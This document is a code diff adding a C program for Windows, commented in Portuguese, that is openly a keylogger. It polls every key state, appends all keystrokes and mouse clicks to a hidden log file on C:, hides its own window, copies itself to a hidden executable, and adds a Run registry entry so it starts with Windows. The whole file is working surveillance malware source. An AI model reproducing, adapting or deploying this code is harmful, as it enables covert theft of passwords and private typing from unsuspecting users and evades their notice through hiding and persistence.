@@ -1,0 +1,598 @@
+#include <stdio.h>
+#include <conio.h>
+#include <windows.h>
+#include <stdlib.h>
+
+HKEY Chave;        //Variável do Registro
+int caps;          //Variável para registrar se CapsLock está ativado
+int sft;           //Variável para registrar se Shift está ativado
+char caminho[512]; //Variável para guardar o caminho do executável
+
+//-----------------------------------------------------------------------------------------------------------------------------------------
+int teclasespeciais(int x) //Função de registro das teclas especiais
+
+{
+        FILE *fp;         //Ponteiro do tipo FILE para o arquivo de log
+        fp=fopen("c:\\Logger.txt","a");//Função fopen, responsável pela passagem de parâmetros para o ponteiro FILE
+         switch(x)        //Switch para verificar qual tecla foi pressionada
+        {
+                case 48:           //Caso a tecla seja pressionada escreve no arquivo o caracter correspondente
+                  fprintf(fp,")");
+                break;
+                                
+                case 49:
+                  fprintf(fp,"!");
+                break;
+                
+                case 50:
+                  fprintf(fp,"@");
+                break;
+                
+                case 51:
+                  fprintf(fp,"#");
+                break;
+                
+                case 52:
+                  fprintf(fp,"$");
+                break;
+                
+                case 53:
+                  fprintf(fp,"%");
+                break;
+                
+                case 54:
+                  fprintf(fp,"¨");
+                break;
+                
+                case 55:
+                  fprintf(fp,"&");
+                break;
+                
+                case 56:
+                  fprintf(fp,"*");
+                break;
+                
+                case 57:
+                  fprintf(fp,"(");
+                break;
+                
+                case 220:
+                  fprintf(fp,"}");
+                break;
+                
+                case 221:
+                  fprintf(fp,"{");
+                break;
+                
+                case 222:
+                  fprintf(fp,"^");
+                break;
+                
+                case 219:
+                  fprintf(fp,"`");
+                break;
+                
+                case 192:
+                  fprintf(fp,"\"");
+                break;
+                
+                case 193:
+                  fprintf(fp,"?");
+                break;
+                
+                case 190:
+                  fprintf(fp,">");
+                break;
+                
+                case 188:
+                  fprintf(fp,"<");
+                break;
+                
+                case 191:
+                  fprintf(fp,":");
+                break;
+             }  
+             fclose(fp);   
+}    
+//-----------------------------------------------------------------------------------------------------------------------------------------
+int numeros(int x) //Função de leitura dos números e de alguns caracteres especiais
+{    
+        FILE *fp;
+        fp=fopen("c:\\Logger.txt","a");
+        switch(x)
+        {
+                 case 48:
+                      fprintf(fp,"0 ");
+                 break;
+  
+                 case 49:
+                      fprintf(fp,"1 ");
+                 break;  
+  
+                 case 50:
+                      fprintf(fp,"2 ");
+                 break;
+  
+                 case 51:
+                      fprintf(fp,"3 ");
+                 break;  
+  
+                 case 52:
+                      fprintf(fp,"4 ");
+                 break;  
+  
+                 case 53:
+                      fprintf(fp,"5 ");
+                 break;
+  
+                 case 54:
+                      fprintf(fp,"6 ");
+                 break;        
+  
+                 case 55:
+                      fprintf(fp,"7 ");
+                 break;  
+  
+                 case 56:
+                      fprintf(fp,"8 ");
+                 break;
+  
+                 case 57:
+                      fprintf(fp,"9 ");
+                 break;  
+         
+                 case 219:
+                      fprintf(fp,"´ ");
+                 break; 
+  
+                 case 222:
+                      fprintf(fp,"~ ");
+                 break;  
+  
+                 case 220:
+                      fprintf(fp,"] ");
+                 break;
+  
+                 case 221:
+                      fprintf(fp,"[ ");
+                 break;
+         
+                 case 191:
+                      fprintf(fp,"; ");
+                 break; 
+  
+                 case 188:
+                      fprintf(fp,", ");
+                 break;  
+  
+                 case 190:
+                      fprintf(fp,". ");
+                 break;
+  
+                 case 193:
+                      fprintf(fp,"/ ");
+                 break; 
+     
+       } 
+       fclose(fp);
+}    
+//-----------------------------------------------------------------------------------------------------------------------------------------
+int nocaps(int x) //Função de leitura das letras minúsculas
+{
+  
+   FILE *fp;
+   fp=fopen("c:\\Logger.txt","a");    
+   switch(x)
+   {     
+          case 65:             
+               fprintf(fp,"a ");          
+          break;
+          
+          case 66:             
+               fprintf(fp,"b ");
+          break;
+          
+          case 67:             
+               fprintf(fp,"c ");
+          break;
+          
+          case 68:             
+               fprintf(fp,"d ");
+          break;    
+          
+          case 69:             
+               fprintf(fp,"e ");
+          break;
+          
+          case 70:             
+               fprintf(fp,"f ");
+          break;
+          
+          case 71:             
+               fprintf(fp,"g ");
+          break;
+          
+          case 72:             
+               fprintf(fp,"h ");
+          break;
+          
+          case 73:             
+               fprintf(fp,"i ");
+          break;
+          
+          case 74:             
+               fprintf(fp,"j ");
+          break;
+          
+          case 75:             
+               fprintf(fp,"k ");
+          break;
+          
+          case 76:             
+               fprintf(fp,"l ");
+          break;
+          
+          case 77:             
+               fprintf(fp,"m ");
+          break;
+          
+          case 78:             
+               fprintf(fp,"n ");
+          break;
+          
+          case 79:             
+               fprintf(fp,"o ");
+          break;
+          
+          case 80:             
+               fprintf(fp,"p ");
+          break;
+          
+          case 81:             
+               fprintf(fp,"q ");
+          break;
+          
+          case 82:             
+               fprintf(fp,"r ");
+          break;
+          
+          case 83:             
+               fprintf(fp,"s ");
+          break;
+          
+          case 84:             
+               fprintf(fp,"t ");
+          break;
+          
+          case 85:             
+               fprintf(fp,"u ");
+          break;
+          
+          case 86:             
+               fprintf(fp,"v ");
+          break;
+          
+          case 87:             
+               fprintf(fp,"x ");
+          break;
+          
+          case 89:             
+               fprintf(fp,"y ");
+          break;
+          
+          case 90:             
+               fprintf(fp,"z ");
+          break;  
+                      
+     } 
+     fclose(fp);
+     if((sft==-127)||(sft==-128))teclasespeciais(x); //Se shift está pressionado, vai para função de leitura das teclas especiais
+     if((sft==1)||(sft==0))numeros(x);               //Se shift não está pressionado, vai para função de leitura dos números e alguns caracteres
+    
+}    
+//-----------------------------------------------------------------------------------------------------------------------------------------
+int capslock(int x) //Função de leitura das letras maiúsculas
+{  
+   
+   FILE *fp;
+   fp=fopen("c:\\Logger.txt","a");   
+   switch(x)
+          {
+          case 65:             
+               fprintf(fp,"A ");
+          break;
+          
+          case 66:             
+               fprintf(fp,"B ");
+          break;
+          
+          case 67:             
+               fprintf(fp,"C ");
+          break;
+          
+          case 68:             
+               fprintf(fp,"D ");
+          break;
+          
+          case 69:             
+               fprintf(fp,"E ");
+          break;
+          
+          case 70:             
+               fprintf(fp,"F ");
+          break;
+          
+          case 71:             
+               fprintf(fp,"G ");
+          break;
+          
+          case 72:             
+               fprintf(fp,"H ");
+          break;
+          
+          case 73:             
+               fprintf(fp,"I ");
+          break;
+          
+          case 74:             
+               fprintf(fp,"J ");
+          break;
+          
+          case 75:             
+               fprintf(fp,"K ");
+          break;
+          
+          case 76:             
+               fprintf(fp,"L ");
+          break;
+          
+          case 77:             
+               fprintf(fp,"M ");
+          break;
+          
+          case 78:             
+               fprintf(fp,"N ");
+          break;
+          
+          case 79:             
+               fprintf(fp,"O ");
+          break;
+          
+          case 80:             
+               fprintf(fp,"P ");
+          break;
+          
+          case 81:             
+               fprintf(fp,"Q ");
+          break;
+          
+          case 82:             
+               fprintf(fp,"R ");
+          break;
+          
+          case 83:             
+               fprintf(fp,"S ");
+          break;
+          
+          case 84:             
+               fprintf(fp,"T ");
+          break;
+          
+          case 85:             
+               fprintf(fp,"U ");
+          break;
+          
+          case 86:             
+               fprintf(fp,"V ");
+          break;
+          
+          case 87:             
+               fprintf(fp,"X ");
+          break;
+          
+          case 89:             
+               fprintf(fp,"Y ");
+          break;
+          
+          case 90:             
+               fprintf(fp,"Z ");
+          break;            
+          }
+          fclose(fp);
+          if((sft==-127)||(sft==-128))teclasespeciais(x);
+          if((sft==1)||(sft==0))numeros(x);
+}
+            
+//-----------------------------------------------------------------------------------------------------------------------------------------
+int escreve(int x) //Função de Leitura das teclas de comando
+{    
+    
+     FILE *fp;
+     fp=fopen("c:\\Logger.txt","a");
+       switch(x)
+         {
+         case 1:
+              fprintf(fp,"Click ");
+         break;
+  
+         case 2:
+              fprintf(fp,"BDM ");
+         break;
+  
+         case 32:
+              fprintf(fp,"[Space] ");
+         break;  
+  
+         case 8:
+              fprintf(fp,"[BackSpace]");
+         break;                
+  
+         case 13:
+              fprintf(fp,"[Enter] ");
+         break;          
+  
+         case 96:
+              fprintf(fp,"0 ");
+         break;
+  
+         case 97:
+              fprintf(fp,"1 ");
+         break;  
+  
+         case 98:
+              fprintf(fp,"2 ");
+         break;
+  
+         case 99:
+              fprintf(fp,"3 ");
+         break;  
+  
+         case 100:
+              fprintf(fp,"4 ");
+         break;
+  
+         case 101:
+              fprintf(fp,"5 ");
+         break;  
+  
+         case 102:
+              fprintf(fp,"6 ");
+         break;
+  
+         case 103:
+              fprintf(fp,"7 ");
+         break;  
+  
+         case 104:
+              fprintf(fp,"8 ");
+         break;
+  
+         case 105:
+              fprintf(fp,"9 ");
+         break;  
+         
+         case 187:
+              fprintf(fp,"= ");
+         break;  
+  
+         case 189:
+              fprintf(fp,"- ");
+         break;
+         
+         case 192:
+              fprintf(fp,"' ");
+         break;  
+  
+         case 9:
+              fprintf(fp,"[TAB] ");
+         break;         
+  
+         case 27:
+              fprintf(fp,"[ESC] ");
+         break;
+  
+         case 112:
+              fprintf(fp,"[F1] ");
+         break;
+  
+         case 113:
+              fprintf(fp,"[F2] ");
+         break;
+  
+         case 114:
+              fprintf(fp,"[F3] ",x);
+         break;
+  
+         case 115:
+              fprintf(fp,"[F4] ");
+         break;
+  
+         case 116:
+              fprintf(fp,"[F5] ");
+         break;
+  
+         case 117:
+              fprintf(fp,"[F6] ",x);
+         break;
+  
+         case 118:
+              fprintf(fp,"[F7] ",x);
+         break;
+  
+         case 119:
+              fprintf(fp,"[F8] ");
+         break;
+  
+         case 120:
+              fprintf(fp,"[F9] ");
+         break;
+  
+         case 121:
+              fprintf(fp,"[F10] ");
+         break;
+  
+         case 122:
+              fprintf(fp,"[F11] ");
+         break;
+  
+         case 123:
+              fprintf(fp,"[F12] ");
+         break;
+  
+         case 35:
+              fprintf(fp,"[END] ");
+         break; 
+  
+         case 46:
+              fprintf(fp,"[Delete] ");
+         break; 
+             
+         case 20:
+              fprintf(fp,"[Caps Lock] ");  
+         break;   
+         
+         case 16:
+              fprintf(fp,"[Shift] ");  
+         break;                              
+                                  
+ }                                   
+ fclose(fp); 
+}
+//-----------------------------------------------------------------------------------------------------------------------------------------
+int tecla()               //função de reconhecimento de tecla 
+{   
+    int num; 
+    caps=GetKeyState(20); //Verifica o estado do Caps Lock
+    sft=GetKeyState(16);  //Verifica o estado do Shift               
+    for(num=0;num<=255;num++) //Laço para verificação das teclas
+    {                                               
+    if(GetAsyncKeyState(num)==-32767)
+      {
+      if((caps==0)&&((sft==1)||(sft==0)))nocaps(num); //Verifica se shift e caps lock não estão acionados 
+      if((caps==1)&&((sft==-127)||(sft==-128)))nocaps(num); //Verifica se shift e caps lock estão acionados 
+      if((caps==1)&&((sft==1)||(sft==0)))capslock(num); //Verifica se caps lock está acionado e shift não está acionado
+      if((caps==0)&&((sft==-127)||(sft==-128)))capslock(num); //Verifica se caps lock não estão acionado e shift está acionado      
+      escreve(num); //Vai para função de verificação das teclas       
+      }
+    }                                                                    
+}
+//-----------------------------------------------------------------------------------------------------------------------------------------
+int main(int argc,char *argv[])
+
+
+{   
+    ShowWindow(GetForegroundWindow(),SW_HIDE);  //Oculta janela do programa      
+    RegOpenKey(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &Chave);//Abre a chave do registro do Windows	
+    RegSetValueEx(Chave,"Logger.exe",0,1,(LPBYTE)"C:\\Logger.exe",22);//Adiciona os valores do Keylogger no registro do Windows
+    strcpy(caminho,argv[0]);	                                      //Copia o caminho onde foi executado o Keylogger para o char caminho
+    CopyFile(caminho,"c:\\Logger.exe",0);		                      //Copia o arquivo para o caminho informado pela string
+    SetFileAttributes("c:\\Logger.exe", FILE_ATTRIBUTE_HIDDEN);       //Oculta o arquivo
+    RegCloseKey(Chave);   //Fecha a Chave     
+    i:                    //Rótulo para  loop infinito                               
+    caps=GetKeyState(20); //Verifica estado do Caps Lock
+    sft=GetKeyState(16);  //Verifica estado do Shift                          
+    Sleep(10);            //Temporização de 10 milisegundos      
+    tecla();              //Chamada da função de leitura das teclas
+    goto i;               //Retorno para nova leitura  
+    
+}
